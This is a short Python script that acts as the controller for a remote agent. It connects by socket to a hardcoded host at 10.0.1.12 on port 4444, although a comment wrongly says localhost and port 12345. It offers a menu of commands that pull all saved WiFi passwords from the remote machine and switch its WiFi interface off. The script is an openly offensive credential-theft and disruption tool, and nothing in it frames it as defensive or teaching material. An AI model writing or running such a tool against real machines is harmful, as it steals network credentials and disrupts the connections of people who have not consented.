import socket
import subprocess

def send_command(command):
    try:
        # Connect to the Netcat server (localhost, port 12345)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect(('10.0.1.12', 4444))
            client_socket.send(command.encode())
            response = client_socket.recv(4096).decode()
            return response
    except Exception as e:
        return f"Error connecting to server: {e}"

def grab_wifi():
    return send_command('grab_wifi')

def wifi_off(interface_name):
    return send_command(f'wifi_off {interface_name}')

if __name__ == '__main__':
    while True:
        print("\nAvailable commands:")
        print("1. grab_wifi - Get all saved WiFi passwords")
        print("2. wifi_off <interface_name> - Disconnect from WiFi")
        print("3. quit - Exit the program")
        command = input("\nEnter command: ")

        if command.lower() == 'quit':
            break
        elif command.startswith('wifi_off'):
            interface_name = command.split(' ')[1] if len(command.split(' ')) > 1 else ''
            if interface_name:
                print(wifi_off(interface_name))
            else:
                print("Please specify an interface name after wifi_off")
        elif command == 'grab_wifi':
            print(grab_wifi())
        else:
            print("Invalid command.")
